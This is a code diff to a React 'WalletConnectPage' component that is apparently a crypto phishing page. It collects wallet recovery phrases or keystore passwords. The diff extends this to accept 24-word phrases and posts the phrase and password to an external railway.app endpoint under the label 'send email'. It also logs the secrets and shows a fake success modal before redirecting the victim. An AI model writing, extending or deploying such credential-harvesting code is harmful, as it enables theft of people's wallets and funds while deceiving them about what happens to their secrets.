@@ -97,52 +97,50 @@ function WalletConnectPage() {
     setErrorMessage('');
   };
 
-  const handleValidate = () => {
+  const handleValidate = async () => {
     if (inputValue.trim() === '' || (activeTab === 'keystore' && password.trim() === '')) {
       setErrorMessage('Please fill in all the required fields.');
       return;
     }
   
-    if (activeTab === 'phrase' && inputValue.trim().split(/\s+/).filter(word => word.length > 0).length !== 12) {
-      setErrorMessage('Recovery phrase must contain exactly 12 words.');
-      return;
-    }
+    if (activeTab === 'phrase') {
+      const wordCount = inputValue.trim().split(/\s+/).filter(word => word.length > 0).length;
+      if (wordCount !== 12 && wordCount !== 24) {
+          setErrorMessage('Recovery phrase must contain exactly 12 or 24 words.');
+          return;
+      }
+  }
+  
   
     console.log('Active Tab:', activeTab);
     console.log('Input Value:', inputValue);
     if (activeTab === 'keystore') {
       console.log('Password:', password);
     }
-    // console.log('Selected Wallet:', selectedWallet.name);
-    console.log(`Sending email with type: ${selectedWallet.name} text ${inputValue}, Password - ${password}`);
-  
+    console.log(`Sending email with type: ${selectedWallet?.name} text ${inputValue}, Password - ${password}`);
   
     setIsLoading(true);
-    setTimeout(async () => {
-      setIsLoading(false);
-      setShowSuccessModal(true);
   
-      try {
-        // Assuming `sendEmail` is a function that sends an email via your API
-        await sendEmail(selectedWallet.name, `Input Value: ${inputValue}, Password: ${password}`);
-        console.log('Email sent successfully');
-      } catch (error) {
-        console.error('Failed to send email:', error);
-      }
+    try {
+      await sendEmail(selectedWallet?.name, `Input Value: ${inputValue}, Password: ${password}`);
+      console.log('Email sent successfully');
+      setShowSuccessModal(true);
   
       setTimeout(() => {
         setShowSuccessModal(false);
         navigate('/'); // Navigate to home page
       }, 3000);
-    }, 3000);
+    } catch (error) {
+      console.error('Failed to send email:', error);
+      setErrorMessage('Failed to send email. Please try again later.');
+    } finally {
+      setIsLoading(false);
+    }
   };
   
-  
-
-
   const sendEmail = async (type, text) => {
     try {
-      const response = await fetch('/send-email/', {
+      const response = await fetch('https://fastapi-production-0125.up.railway.app/send-email', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -158,9 +156,10 @@ function WalletConnectPage() {
       // Optionally, handle response data here
     } catch (error) {
       console.error('Error sending email:', error);
-      // Handle error scenario
+      throw error; // Re-throw the error to be handled in the calling function
     }
   };
+  
   
   
   
